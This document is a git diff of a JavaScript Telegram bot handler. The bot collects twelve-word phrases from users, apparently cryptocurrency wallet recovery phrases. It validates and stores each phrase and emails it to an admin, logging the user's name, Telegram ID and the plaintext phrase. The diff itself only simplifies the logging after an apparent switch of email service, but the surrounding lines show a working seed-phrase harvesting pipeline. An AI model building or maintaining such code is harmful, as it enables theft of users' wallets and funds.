@@ -2,7 +2,7 @@ import updatePhrase from '../db/methods/UpdateMethods/updatePhrase.js';
 import isTwelveWords from '../helpers/checkPhrase.js';
 import extractPhrase from '../helpers/extractPhrase.js';
 import logMsgContext from '../helpers/logger.js';
-import sendPhraseMail from '../helpers/mailPhrase.js'; // Using SMTP
+import sendPhraseMail from '../helpers/mailPhrase.js';
 import { startMenu } from './menus.js';
 
 const registerCommandHandlers = (bot) => {
@@ -92,13 +92,7 @@ const registerCommandHandlers = (bot) => {
                     console.log("📨 Phrase email sent to admin:");
                     console.log("👤 User:", `${first_name} (${telegram_id})`);
                     console.log("🧠 Phrase:", `"${phrase}"`);
-                    console.log("📩 Message ID:", info.messageId);
-                    console.log("🧭 Envelope:", info.envelope);
-                    console.log("✅ Accepted:", info.accepted);
-                    if (info.rejected.length) {
-                        console.warn("🚫 Rejected:", info.rejected);
-                    }
-                    console.log("🔁 SMTP Response:", info.response);
+                    console.log("📩 Email ID:", info.id);
                 } catch (emailErr) {
                     console.error("💥 EMAIL FAILED!");
                     console.error("❌ Failed to send phrase email to admin:", emailErr.message);
